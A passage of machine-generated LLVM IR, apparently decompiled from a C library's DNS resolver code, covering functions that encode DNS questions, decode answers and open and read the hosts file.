  %tmp4 = icmp slt i8 %v4_1a4c0, 0
  %v3_1a4c4 = zext i1 %tmp4 to i32
  %v2_1a4c8 = add i32 %arg2, 4
  %v3_1a4c8 = inttoptr i32 %v2_1a4c8 to i32*
  store i32 %v3_1a4c4, i32* %v3_1a4c8, align 4
  %v4_1a4cc = load i8, i8* %v3_1a4c0, align 1
  %div = udiv i8 %v4_1a4cc, 8
  %tmp5 = urem i8 %div, 16
  %v1_1a4d4 = zext i8 %tmp5 to i32
  %v2_1a4d8 = add i32 %arg2, 8
  %v3_1a4d8 = inttoptr i32 %v2_1a4d8 to i32*
  store i32 %v1_1a4d4, i32* %v3_1a4d8, align 4
  %v4_1a4dc = load i8, i8* %v3_1a4c0, align 1
  %div1 = udiv i8 %v4_1a4dc, 4
  %tmp6 = urem i8 %div1, 2
  %v1_1a4e4 = zext i8 %tmp6 to i32
  %v2_1a4e8 = add i32 %arg2, 12
  %v3_1a4e8 = inttoptr i32 %v2_1a4e8 to i32*
  store i32 %v1_1a4e4, i32* %v3_1a4e8, align 4
  %v4_1a4ec = load i8, i8* %v3_1a4c0, align 1
  %div2 = udiv i8 %v4_1a4ec, 2
  %tmp7 = urem i8 %div2, 2
  %v1_1a4f4 = zext i8 %tmp7 to i32
  %v2_1a4f8 = add i32 %arg2, 16
  %v3_1a4f8 = inttoptr i32 %v2_1a4f8 to i32*
  store i32 %v1_1a4f4, i32* %v3_1a4f8, align 4
  %v4_1a4fc = load i8, i8* %v3_1a4c0, align 1
  %tmp8 = urem i8 %v4_1a4fc, 2
  %v1_1a500 = zext i8 %tmp8 to i32
  %v2_1a504 = add i32 %arg2, 20
  %v3_1a504 = inttoptr i32 %v2_1a504 to i32*
  store i32 %v1_1a500, i32* %v3_1a504, align 4
  %v2_1a508 = add i32 %tmp, 3
  %v3_1a508 = inttoptr i32 %v2_1a508 to i8*
  %v4_1a508 = load i8, i8* %v3_1a508, align 1
  %tmp9 = icmp slt i8 %v4_1a508, 0
  %v3_1a50c = zext i1 %tmp9 to i32
  %v2_1a510 = add i32 %arg2, 24
  %v3_1a510 = inttoptr i32 %v2_1a510 to i32*
  store i32 %v3_1a50c, i32* %v3_1a510, align 4
  %v4_1a514 = load i8, i8* %v3_1a508, align 1
  %tmp10 = urem i8 %v4_1a514, 16
  %v1_1a518 = zext i8 %tmp10 to i32
  %v2_1a51c = add i32 %arg2, 28
  %v3_1a51c = inttoptr i32 %v2_1a51c to i32*
  store i32 %v1_1a518, i32* %v3_1a51c, align 4
  %v2_1a520 = add i32 %tmp, 4
  %v3_1a520 = inttoptr i32 %v2_1a520 to i8*
  %v4_1a520 = load i8, i8* %v3_1a520, align 1
  %v5_1a520 = zext i8 %v4_1a520 to i32
  %v2_1a524 = add i32 %tmp, 5
  %v3_1a524 = inttoptr i32 %v2_1a524 to i8*
  %v4_1a524 = load i8, i8* %v3_1a524, align 1
  %v5_1a524 = zext i8 %v4_1a524 to i32
  %v4_1a528 = mul nuw nsw i32 %v5_1a520, 256
  %v5_1a528 = or i32 %v5_1a524, %v4_1a528
  %v2_1a52c = add i32 %arg2, 32
  %v3_1a52c = inttoptr i32 %v2_1a52c to i32*
  store i32 %v5_1a528, i32* %v3_1a52c, align 4
  %v2_1a530 = add i32 %tmp, 6
  %v3_1a530 = inttoptr i32 %v2_1a530 to i8*
  %v4_1a530 = load i8, i8* %v3_1a530, align 1
  %v5_1a530 = zext i8 %v4_1a530 to i32
  %v2_1a534 = add i32 %tmp, 7
  %v3_1a534 = inttoptr i32 %v2_1a534 to i8*
  %v4_1a534 = load i8, i8* %v3_1a534, align 1
  %v5_1a534 = zext i8 %v4_1a534 to i32
  %v4_1a538 = mul nuw nsw i32 %v5_1a530, 256
  %v5_1a538 = or i32 %v5_1a534, %v4_1a538
  %v2_1a53c = add i32 %arg2, 36
  %v3_1a53c = inttoptr i32 %v2_1a53c to i32*
  store i32 %v5_1a538, i32* %v3_1a53c, align 4
  %v2_1a540 = add i32 %tmp, 8
  %v3_1a540 = inttoptr i32 %v2_1a540 to i8*
  %v4_1a540 = load i8, i8* %v3_1a540, align 1
  %v5_1a540 = zext i8 %v4_1a540 to i32
  %v2_1a544 = add i32 %tmp, 9
  %v3_1a544 = inttoptr i32 %v2_1a544 to i8*
  %v4_1a544 = load i8, i8* %v3_1a544, align 1
  %v5_1a544 = zext i8 %v4_1a544 to i32
  %v4_1a548 = mul nuw nsw i32 %v5_1a540, 256
  %v5_1a548 = or i32 %v5_1a544, %v4_1a548
  %v2_1a54c = add i32 %arg2, 40
  %v3_1a54c = inttoptr i32 %v2_1a54c to i32*
  store i32 %v5_1a548, i32* %v3_1a54c, align 4
  %v2_1a550 = add i32 %tmp, 11
  %v3_1a550 = inttoptr i32 %v2_1a550 to i8*
  %v4_1a550 = load i8, i8* %v3_1a550, align 1
  %v5_1a550 = zext i8 %v4_1a550 to i32
  %v2_1a554 = add i32 %tmp, 10
  %v3_1a554 = inttoptr i32 %v2_1a554 to i8*
  %v4_1a554 = load i8, i8* %v3_1a554, align 1
  %v5_1a554 = zext i8 %v4_1a554 to i32
  %v4_1a55c = mul nuw nsw i32 %v5_1a554, 256
  %v5_1a55c = or i32 %v4_1a55c, %v5_1a550
  %v2_1a560 = add i32 %arg2, 44
  %v3_1a560 = inttoptr i32 %v2_1a560 to i32*
  store i32 %v5_1a55c, i32* %v3_1a560, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 22, 23, 6, 9, 10, 11, 12, 4, 5, 13, 14, 15, 16, 17, 0, 18, 19, 7, 20, 21, 8, 3, 2, 1, 24, 25 }
  uselistorder i32 40, { 10, 11, 3, 13, 1, 12, 2, 0, 4, 5, 6, 7, 8, 9, 14 }
  uselistorder i32 28, { 32, 5, 6, 7, 33, 22, 41, 37, 39, 8, 38, 1, 23, 18, 2, 34, 35, 24, 25, 26, 27, 28, 29, 0, 30, 17, 36, 19, 20, 21, 3, 4, 31, 13, 12, 10, 11, 14, 15, 9, 16, 40 }
  uselistorder i8 2, { 0, 1, 2, 3, 7, 4, 5, 6, 8 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a568 = load i32, i32* @r4, align 4
  store i32 %v3_1a568, i32* %stack_var_-16, align 4
  %v6_1a568 = load i32, i32* @r5, align 4
  %v9_1a568 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1a570 = load i32, i32* %arg1, align 4
  store i32 %v2_1a570, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_1a57c = inttoptr i32 %v2_1a570 to i8*
  %v2_1a57c = call i32 @__encode_dotted(i8* %v1_1a57c)
  store i32 %v2_1a57c, i32* %r0.global-to-local, align 4
  %v1_1a580 = icmp slt i32 %v2_1a57c, 0
  br i1 %v1_1a580, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_1a588 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_1a588, i32* @r4, align 4
  store i32 %v6_1a568, i32* @r5, align 4
  store i32 %v9_1a568, i32* @r6, align 4
  ret i32 %v2_1a57c

bb6:                                              ; preds = %entry
  %v1_1a584 = load i32, i32* @r4, align 4
  %v2_1a584 = sub i32 %v1_1a584, %v2_1a57c
  %v0_1a590 = load i32, i32* @r6, align 4
  %v2_1a590 = add i32 %v0_1a590, %v2_1a57c
  store i32 %v2_1a590, i32* %r2.global-to-local, align 4
  %v7_1a594 = icmp sgt i32 %v2_1a584, 3
  br i1 %v7_1a594, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_1a598 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_1a598, i32* @r4, align 4
  store i32 %v6_1a568, i32* @r5, align 4
  store i32 %v9_1a568, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_1a59c = load i32, i32* @r5, align 4
  %v1_1a59c = add i32 %v0_1a59c, 5
  %v2_1a59c = inttoptr i32 %v1_1a59c to i8*
  %v3_1a59c = load i8, i8* %v2_1a59c, align 1
  %v5_1a5a0 = inttoptr i32 %v2_1a590 to i8*
  store i8 %v3_1a59c, i8* %v5_1a5a0, align 1
  %v0_1a5a4 = load i32, i32* @r5, align 4
  %v1_1a5a4 = add i32 %v0_1a5a4, 4
  %v2_1a5a4 = inttoptr i32 %v1_1a5a4 to i32*
  %v3_1a5a4 = load i32, i32* %v2_1a5a4, align 4
  %v1_1a5a8 = trunc i32 %v3_1a5a4 to i8
  %v2_1a5a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_1a5a8 = add i32 %v2_1a5a8, 1
  %v4_1a5a8 = inttoptr i32 %v3_1a5a8 to i8*
  store i8 %v1_1a5a8, i8* %v4_1a5a8, align 1
  %v0_1a5ac = load i32, i32* @r5, align 4
  %v1_1a5ac = add i32 %v0_1a5ac, 9
  %v2_1a5ac = inttoptr i32 %v1_1a5ac to i8*
  %v3_1a5ac = load i8, i8* %v2_1a5ac, align 1
  %v2_1a5b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_1a5b0 = add i32 %v2_1a5b0, 2
  %v4_1a5b0 = inttoptr i32 %v3_1a5b0 to i8*
  store i8 %v3_1a5ac, i8* %v4_1a5b0, align 1
  %v0_1a5b4 = load i32, i32* @r5, align 4
  %v1_1a5b4 = add i32 %v0_1a5b4, 8
  %v2_1a5b4 = inttoptr i32 %v1_1a5b4 to i32*
  %v3_1a5b4 = load i32, i32* %v2_1a5b4, align 4
  %v0_1a5b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a5b8 = add i32 %v0_1a5b8, 4
  store i32 %v1_1a5b8, i32* %r0.global-to-local, align 4
  %v1_1a5bc = trunc i32 %v3_1a5b4 to i8
  %v2_1a5bc = load i32, i32* %r2.global-to-local, align 4
  %v3_1a5bc = add i32 %v2_1a5bc, 3
  %v4_1a5bc = inttoptr i32 %v3_1a5bc to i8*
  store i8 %v1_1a5bc, i8* %v4_1a5bc, align 1
  %v2_1a5c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a5c0, i32* @r4, align 4
  store i32 %v6_1a568, i32* @r5, align 4
  store i32 %v9_1a568, i32* @r6, align 4
  ret i32 %v1_1a5b8

; uselistorder directives
  uselistorder i32 %v2_1a57c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_1a568, { 1, 0, 2 }
  uselistorder i32 %v6_1a568, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1a5c8 = call i32 @__length_dotted()
  %v1_1a5cc = icmp slt i32 %v0_1a5c8, 0
  br i1 %v1_1a5cc, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_1a5d0 = add i32 %v0_1a5c8, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_1a5d4 = phi i32 [ %v0_1a5c8, %entry ], [ %v4_1a5d0, %bb ]
  ret i32 %v5_1a5d4

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_1a5d8 = load i32, i32* @r4, align 4
  %v6_1a5d8 = load i32, i32* @r5, align 4
  %v9_1a5d8 = load i32, i32* @r6, align 4
  %v12_1a5d8 = load i32, i32* @r7, align 4
  %v21_1a5d8 = load i32, i32* @sl, align 4
  %v2_1a5dc = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_1a5dc, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_1a5f8 = call i32 @__decode_dotted()
  store i32 %v0_1a5f8, i32* %r0.global-to-local, align 4
  store i32 %v0_1a5f8, i32* @r7, align 4
  %v1_1a5fc = icmp slt i32 %v0_1a5f8, 0
  %v0_1a600 = load i32, i32* @r4, align 4
  %v2_1a600 = add i32 %v0_1a600, %v0_1a5f8
  store i32 %v2_1a600, i32* %r8.global-to-local, align 4
  br i1 %v1_1a5fc, label %bb14, label %dec_label_pc_1a610

dec_label_pc_1a610:                               ; preds = %entry
  %v1_1a608 = load i32, i32* @r5, align 4
  %v2_1a608 = sub i32 %v1_1a608, %v2_1a600
  %v1_1a610 = add i32 %v2_1a608, -10
  store i32 %v1_1a610, i32* @r5, align 4
  %v6_1a610 = icmp slt i32 %v1_1a610, 0
  store i32 %v2_1a5dc, i32* %r0.global-to-local, align 4
  %v0_1a618 = load i32, i32* @sl, align 4
  %v2_1a618 = add i32 %v0_1a618, %v2_1a600
  store i32 %v2_1a618, i32* @r4, align 4
  br i1 %v6_1a610, label %bb, label %dec_label_pc_1a624

bb:                                               ; preds = %dec_label_pc_1a610
  br label %bb14

dec_label_pc_1a624:                               ; preds = %dec_label_pc_1a610
  %v1_1a624 = bitcast i32* %stack_var_-288 to i8*
  %v2_1a624 = call i32 @__GI_strdup(i8* %v1_1a624)
  store i32 %v2_1a624, i32* %r0.global-to-local, align 4
  %v1_1a628 = load i32, i32* @r6, align 4
  %v2_1a628 = inttoptr i32 %v1_1a628 to i32*
  store i32 %v2_1a624, i32* %v2_1a628, align 4
  %v0_1a62c = load i32, i32* @sl, align 4
  %v1_1a62c = load i32, i32* %r8.global-to-local, align 4
  %v2_1a62c = add i32 %v1_1a62c, %v0_1a62c
  %v3_1a62c = inttoptr i32 %v2_1a62c to i8*
  %v4_1a62c = load i8, i8* %v3_1a62c, align 1
  %v6_1a62c = zext i8 %v4_1a62c to i32
  %v0_1a630 = load i32, i32* @r4, align 4
  %v1_1a630 = add i32 %v0_1a630, 1
  %v2_1a630 = inttoptr i32 %v1_1a630 to i8*
  %v3_1a630 = load i8, i8* %v2_1a630, align 1
  %v4_1a630 = zext i8 %v3_1a630 to i32
  %v4_1a634 = mul nuw nsw i32 %v6_1a62c, 256
  %v5_1a634 = or i32 %v4_1a630, %v4_1a634
  store i32 %v5_1a634, i32* %r3.global-to-local, align 4
  %v1_1a638 = load i32, i32* @r6, align 4
  %v2_1a638 = add i32 %v1_1a638, 4
  %v3_1a638 = inttoptr i32 %v2_1a638 to i32*
  store i32 %v5_1a634, i32* %v3_1a638, align 4
  %v0_1a63c = load i32, i32* @r4, align 4
  %v1_1a63c = add i32 %v0_1a63c, 2
  store i32 %v1_1a63c, i32* %r1.global-to-local, align 4
  %v2_1a640 = inttoptr i32 %v1_1a63c to i8*
  %v3_1a640 = load i8, i8* %v2_1a640, align 1
  %v4_1a640 = zext i8 %v3_1a640 to i32
  %v1_1a644 = add i32 %v0_1a63c, 3
  %v2_1a644 = inttoptr i32 %v1_1a644 to i8*
  %v3_1a644 = load i8, i8* %v2_1a644, align 1
  %v4_1a644 = zext i8 %v3_1a644 to i32
  %v4_1a648 = mul nuw nsw i32 %v4_1a640, 256
  %v5_1a648 = or i32 %v4_1a644, %v4_1a648
  store i32 %v5_1a648, i32* %r3.global-to-local, align 4
  %v1_1a64c = load i32, i32* @r6, align 4
  %v2_1a64c = add i32 %v1_1a64c, 8
  %v3_1a64c = inttoptr i32 %v2_1a64c to i32*
  store i32 %v5_1a648, i32* %v3_1a64c, align 4
  %v0_1a650 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a650 = add i32 %v0_1a650, 2
  %v1_1a654 = add i32 %v0_1a650, 3
  %v2_1a654 = inttoptr i32 %v1_1a654 to i8*
  %v3_1a654 = load i8, i8* %v2_1a654, align 1
  %v4_1a654 = zext i8 %v3_1a654 to i32
  store i32 %v4_1a654, i32* %r3.global-to-local, align 4
  %v2_1a658 = inttoptr i32 %v1_1a650 to i8*
  %v3_1a658 = load i8, i8* %v2_1a658, align 1
  %v4_1a658 = zext i8 %v3_1a658 to i32
  store i32 %v4_1a658, i32* %r0.global-to-local, align 4
  %v1_1a65c = add i32 %v0_1a650, 5
  %v2_1a65c = inttoptr i32 %v1_1a65c to i8*
  %v3_1a65c = load i8, i8* %v2_1a65c, align 1
  %v4_1a65c = zext i8 %v3_1a65c to i32
  %v3_1a660 = mul nuw nsw i32 %v4_1a654, 65536
  store i32 %v3_1a660, i32* %r3.global-to-local, align 4
  %v1_1a664 = add i32 %v0_1a650, 4
  %v2_1a664 = inttoptr i32 %v1_1a664 to i8*
  %v3_1a664 = load i8, i8* %v2_1a664, align 1
  %v4_1a664 = zext i8 %v3_1a664 to i32
  %v4_1a668 = mul nuw i32 %v4_1a658, 16777216
  %v5_1a668 = or i32 %v4_1a668, %v3_1a660
  %v2_1a66c = or i32 %v5_1a668, %v4_1a65c
  %v4_1a670 = mul nuw nsw i32 %v4_1a664, 256
  %v5_1a670 = or i32 %v2_1a66c, %v4_1a670
  store i32 %v5_1a670, i32* %r3.global-to-local, align 4
  %v1_1a674 = load i32, i32* @r6, align 4
  %v2_1a674 = add i32 %v1_1a674, 12
  %v3_1a674 = inttoptr i32 %v2_1a674 to i32*
  store i32 %v5_1a670, i32* %v3_1a674, align 4
  %v0_1a678 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a678 = add i32 %v0_1a678, 6
  %v2_1a678 = inttoptr i32 %v1_1a678 to i8*
  %v3_1a678 = load i8, i8* %v2_1a678, align 1
  %v4_1a678 = zext i8 %v3_1a678 to i32
  %v0_1a67c = load i32, i32* @r4, align 4
  %v1_1a67c = add i32 %v0_1a67c, 9
  %v2_1a67c = inttoptr i32 %v1_1a67c to i8*
  %v3_1a67c = load i8, i8* %v2_1a67c, align 1
  %v4_1a67c = zext i8 %v3_1a67c to i32
  %v1_1a680 = add i32 %v0_1a67c, 10
  store i32 %v1_1a680, i32* %r0.global-to-local, align 4
  %v4_1a684 = mul nuw nsw i32 %v4_1a678, 256
  %v5_1a684 = or i32 %v4_1a67c, %v4_1a684
  store i32 %v5_1a684, i32* %r3.global-to-local, align 4
  %v0_1a688 = load i32, i32* %r8.global-to-local, align 4
  %v1_1a688 = add i32 %v0_1a688, 10
  %v0_1a68c = load i32, i32* @r5, align 4
  %v1_1a690 = add nuw nsw i32 %v5_1a684, 10
  store i32 %v1_1a690, i32* %r1.global-to-local, align 4
  %v1_1a694 = load i32, i32* @r6, align 4
  %v2_1a694 = add i32 %v1_1a694, 24
  %v3_1a694 = inttoptr i32 %v2_1a694 to i32*
  store i32 %v1_1a688, i32* %v3_1a694, align 4
  %v0_1a698 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a698 = load i32, i32* @r6, align 4
  %v2_1a698 = add i32 %v1_1a698, 20
  %v3_1a698 = inttoptr i32 %v2_1a698 to i32*
  store i32 %v0_1a698, i32* %v3_1a698, align 4
  %v0_1a69c = load i32, i32* %r3.global-to-local, align 4
  %v1_1a69c = load i32, i32* @r6, align 4
  %v2_1a69c = add i32 %v1_1a69c, 16
  %v3_1a69c = inttoptr i32 %v2_1a69c to i32*
  store i32 %v0_1a69c, i32* %v3_1a69c, align 4
  %v0_1a6a0 = load i32, i32* @r7, align 4
  %v1_1a6a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a6a0 = add i32 %v1_1a6a0, %v0_1a6a0
  %v5_1a6a4 = icmp slt i32 %v0_1a68c, %v5_1a684
  %.v2_1a6a0 = select i1 %v5_1a6a4, i32 -1, i32 %v2_1a6a0
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_1a624, %entry
  %v0_1a6a8 = phi i32 [ %.v2_1a6a0, %dec_label_pc_1a624 ], [ %v1_1a610, %bb ], [ %v0_1a5f8, %entry ]
  store i32 %v0_1a6a8, i32* %r0.global-to-local, align 4
  store i32 %v3_1a5d8, i32* @r4, align 4
  store i32 %v6_1a5d8, i32* @r5, align 4
  store i32 %v9_1a5d8, i32* @r6, align 4
  store i32 %v12_1a5d8, i32* @r7, align 4
  store i32 %v21_1a5d8, i32* @sl, align 4
  ret i32 %v0_1a6a8

; uselistorder directives
  uselistorder i32 %v0_1a6a8, { 1, 0 }
  uselistorder i32 %v5_1a684, { 1, 0, 2 }
  uselistorder i32 %v3_1a660, { 1, 0 }
  uselistorder i32 %v1_1a610, { 0, 2, 1 }
  uselistorder i32 %v0_1a5f8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 20, { 30, 31, 32, 33, 0, 19, 37, 3, 38, 1, 4, 34, 5, 20, 21, 11, 29, 12, 6, 2, 7, 22, 23, 24, 25, 13, 35, 14, 15, 16, 17, 18, 26, 27, 28, 8, 9, 10, 36 }
  uselistorder i32 24, { 28, 29, 30, 20, 37, 0, 31, 32, 33, 21, 10, 38, 11, 1, 34, 22, 23, 24, 25, 26, 27, 12, 35, 36, 13, 14, 15, 16, 17, 18, 19, 7, 8, 4, 3, 9, 2, 5, 6, 39, 40 }
  uselistorder i32 9, { 14, 15, 16, 17, 18, 3, 19, 4, 8, 23, 5, 9, 10, 11, 12, 13, 6, 7, 2, 1, 0, 20, 21, 22 }
  uselistorder i32 6, { 21, 22, 23, 14, 15, 16, 17, 1, 2, 26, 3, 4, 18, 0, 5, 6, 7, 8, 9, 10, 19, 20, 11, 13, 12, 24, 25 }
  uselistorder i32 5, { 1, 21, 22, 23, 12, 6, 2, 13, 14, 7, 15, 3, 5, 0, 16, 17, 8, 18, 19, 20, 9, 11, 10, 4, 24, 25, 26 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1e218.1156 to i32), i32* @r1, align 4
  %v0_1a6b8 = load i32, i32* @lr, align 4
  store i32 %v0_1a6b8, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1e27c.1190 to i32), i32* @r0, align 4
  %v3_1a6c0 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1e27c.1190 to i32), i32 ptrtoint (i32* @global_var_1e218.1156 to i32))
  %v2_1a6c4 = icmp eq i32 %v3_1a6c0, 0
  store i32 ptrtoint (i32* @global_var_1e218.1156 to i32), i32* @r1, align 4
  br i1 %v2_1a6c4, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_1a6c0

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_1e288.1192 to i32), i32* @r0, align 4
  %v2_1a6d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_1a6d4, i32* @lr, align 4
  %v3_1a6d8 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1e288.1192 to i32), i32 ptrtoint (i32* @global_var_1e218.1156 to i32))
  ret i32 %v3_1a6d8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 2, 1, 0, 5, 4, 3 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1e218.1156 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_1a6e8 = load i32, i32* @r4, align 4
  %v6_1a6e8 = load i32, i32* @r5, align 4
  %v12_1a6e8 = load i32, i32* @r7, align 4
  %v15_1a6e8 = load i32, i32* @r8, align 4
  %v21_1a6e8 = load i32, i32* @sl, align 4
  %v24_1a6e8 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_1a6f4 = sub i32 0, %tmp61
  %v1_1a6f8 = urem i32 %v1_1a6f4, 4
  store i32 %v1_1a6f8, i32* %ip.global-to-local, align 4
  %v2_1a6f8 = icmp eq i32 %v1_1a6f8, 0
  %v0_1a6fc = load i32, i32* @r2, align 4
  %v0_1a700 = load i32, i32* @r0, align 4
  %v0_1a704 = load i32, i32* @r1, align 4
  %v0_1a708 = load i32, i32* @r3, align 4
  store i32 %v0_1a708, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_1a6f8, label %dec_label_pc_1a728, label %dec_label_pc_1a718

dec_label_pc_1a718:                               ; preds = %entry
  %v2_1a718 = sub i32 %tmp57, %v1_1a6f8
  %v3_1a718 = icmp ult i32 %tmp57, %v1_1a6f8
  br i1 %v3_1a718, label %dec_label_pc_1a9fc, label %dec_label_pc_1a720

dec_label_pc_1a720:                               ; preds = %dec_label_pc_1a718
  store i32 %v2_1a718, i32* %r2.global-to-local, align 4
  %v2_1a724 = add i32 %v1_1a6f8, %tmp61
  store i32 %v2_1a724, i32* @r4, align 4
  br label %dec_label_pc_1a728

dec_label_pc_1a728:                               ; preds = %entry, %dec_label_pc_1a720
  %v0_1a738 = phi i32 [ %tmp61, %entry ], [ %v2_1a724, %dec_label_pc_1a720 ]
  %v0_1a73c = phi i32 [ %tmp57, %entry ], [ %v2_1a718, %dec_label_pc_1a720 ]
  %tmp = icmp ult i32 %v0_1a73c, 32
  br i1 %tmp, label %dec_label_pc_1a9fc, label %dec_label_pc_1a730

dec_label_pc_1a730:                               ; preds = %dec_label_pc_1a728
  store i32 %v0_1a708, i32* %r0.global-to-local, align 4
  %v7_1a734 = icmp eq i32 %v0_1a708, 1
  %v1_1a738 = add i32 %v0_1a738, 32
  store i32 %v1_1a738, i32* @fp, align 4
  %v1_1a73c = add i32 %v0_1a73c, -32
  store i32 %v1_1a73c, i32* @r8, align 4
  br i1 %v7_1a734, label %dec_label_pc_1a868, label %dec_label_pc_1a744

dec_label_pc_1a744:                               ; preds = %dec_label_pc_1a730
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1a750 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_1a750, align 4
  %tmp80 = icmp ult i32 %v1_1a73c, 4
  br i1 %tmp80, label %dec_label_pc_1a9fc, label %dec_label_pc_1a758

dec_label_pc_1a758:                               ; preds = %dec_label_pc_1a744
  %v0_1a758 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a758 = add i32 %v0_1a758, -36
  store i32 %v1_1a758, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_1a758, 8
  br i1 %tmp81, label %dec_label_pc_1a9fc, label %dec_label_pc_1a764

dec_label_pc_1a764:                               ; preds = %dec_label_pc_1a758
  %v0_1a764 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_1a764, 16
  br i1 %tmp82, label %dec_label_pc_1a9fc, label %dec_label_pc_1a76c

dec_label_pc_1a76c:                               ; preds = %dec_label_pc_1a764
  %v1_1a76c = add i32 %v0_1a758, -48
  store i32 %v1_1a76c, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_1a76c, 8
  br i1 %tmp83, label %dec_label_pc_1a9fc, label %dec_label_pc_1a778

dec_label_pc_1a778:                               ; preds = %dec_label_pc_1a76c
  %v1_1a778 = add i32 %v0_1a758, -44
  store i32 %v1_1a778, i32* @r8, align 4
  %v1_1a77c = add i32 %v0_1a758, -56
  store i32 %v1_1a77c, i32* %r3.global-to-local, align 4
  %v3_1a780 = icmp ult i32 %v1_1a77c, %v1_1a778
  br i1 %v3_1a780, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1a778
  %v1_1a788 = load i32, i32* @r4, align 4
  %v2_1a788 = add i32 %v1_1a788, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_1a778
  store i32 %v1_1a77c, i32* @r8, align 4
  %v1_1a78c.pre = load i32, i32* @r4, align 4
  %v2_1a78c = add i32 %v1_1a78c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_1a78c, %.thread1 ], [ %v2_1a788, %bb ]
  %v0_1a794 = phi i32 [ %v1_1a78c.pre, %.thread1 ], [ %v1_1a788, %bb ]
  %v0_1a790 = phi i32 [ %v1_1a77c, %.thread1 ], [ %v1_1a778, %bb ]
  store i32 %storemerge, i32* @r5, align 4
